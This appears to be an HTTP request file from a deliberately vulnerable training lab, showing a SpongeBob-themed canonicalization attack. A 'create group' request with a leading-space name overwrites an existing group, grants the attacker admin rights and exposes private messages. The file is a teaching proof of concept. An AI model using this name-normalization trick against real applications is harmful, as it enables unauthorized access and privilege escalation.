@base = http://localhost:8000/vuln/confusion/canonicalization/example22

GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
###

# We start with the same setup as previously, Plankton is unable to access Mr. Krabs group.
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Expect:
# Forbidden: not an member for the requested group

###

# Plankton uses `create_group` functionality with a malicious group name that passes uniqueness check,
# but actually is Mr. Krabs's group with an extra whitespace. This extra whitespace gets removed by the code,
# and handler performs group update instead of creating a new group.
POST {{base}}/groups/new
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": " staff@krusty-krab.sea",
    "users": [
        { "role": "member", "user": "spongebob@krusty-krab.sea" },
        { "role": "member", "user": "squidward@krusty-krab.sea" },
        { "role": "admin", "user": "mr.krabs@krusty-krab.sea" },
        { "role": "admin", "user": "plankton@chum-bucket.sea"}
      ],
    "messages": []
}

# Expect:
# {
#   "status": "ok"
# }

###

# As a result, now Plankton not only can see message history, but he also has an admin privilieges.
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Expect
# [
#   {
#     "from_user": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]